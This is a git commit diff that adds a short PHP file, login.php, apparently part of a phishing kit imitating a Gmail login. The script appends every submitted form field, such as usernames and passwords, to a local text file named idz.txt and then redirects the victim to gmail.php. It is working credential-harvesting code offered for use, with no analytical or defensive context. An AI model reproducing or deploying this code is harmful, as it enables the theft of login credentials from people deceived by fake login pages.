4fb884254da9c7c0282f18e875e27cbf2ccdb3ba
Philiphackerzx <65859306+Philiphackerzx@users.noreply.github.com>
2020-05-25 00:44:51 -0700

    Add files via upload

---
+++ asset/gcode/login.php
@@ -0,0 +1,19 @@
+ <?php
+
+// www.philiphacker.in
+header
+('location:');
+$handle=fopen("idz.txt","a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"=");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+header("location:gmail.php");
+exit;
+// www.philiphacker.in
+?>
